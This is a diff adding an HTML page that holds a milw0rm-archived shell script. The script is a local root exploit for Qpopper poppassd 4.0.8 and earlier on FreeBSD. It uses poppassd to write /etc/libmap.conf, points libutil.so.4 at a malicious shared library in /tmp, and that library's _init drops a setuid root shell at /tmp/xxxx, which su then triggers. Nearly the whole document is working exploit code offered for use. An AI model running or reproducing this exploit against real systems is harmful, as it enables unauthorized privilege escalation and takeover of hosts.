@@ -1,0 +1,56 @@
+<html>
+<head>
+<title>Qpopper <= 4.0.8 (poppassd) Local Root Exploit (freebsd)</title>
+<pre>
+#!/bin/sh
+###########################################################################
+# FreeBSD Qpopper poppassd latest version local r00t exploit by kcope   ###
+# tested on FreeBSD 5.4-RELEASE                                         ###
+###########################################################################
+
+POPPASSD_PATH=/usr/local/bin/poppassd
+HOOKLIB=libutil.so.4
+
+echo &quot;&quot;
+echo &quot;FreeBSD Qpopper poppassd latest version local r00t exploit by kcope&quot;
+echo &quot;&quot;
+sleep 2
+umask 0000
+if [ -f /etc/libmap.conf ]; then
+echo &quot;OOPS /etc/libmap.conf already exists.. exploit failed!&quot;
+exit
+fi
+cat &gt; program.c &lt;&lt; _EOF
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init()
+{
+ if (!geteuid()) {
+ remove(&quot;/etc/libmap.conf&quot;);
+ execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-c&quot;,&quot;/bin/cp /bin/sh /tmp/xxxx ; /bin/chmod +xs /tmp/xxxx&quot;,NULL);
+ }
+}
+
+_EOF
+gcc -o program.o -c program.c -fPIC
+gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles
+cp libno_ex.so.1.0 /tmp/libno_ex.so.1.0
+echo &quot;--- Now type ENTER ---&quot;
+echo &quot;&quot;
+$POPPASSD_PATH -t /etc/libmap.conf
+echo $HOOKLIB ../../../../../../tmp/libno_ex.so.1.0 &gt; /etc/libmap.conf
+su
+if [ -f /tmp/xxxx ]; then
+echo &quot;IT'S A ROOTSHELL!!!&quot;
+/tmp/xxxx
+else
+echo &quot;Sorry, exploit failed.&quot;
+fi
+
+# milw0rm.com [2005-09-24]
+</pre>
+</html>
+
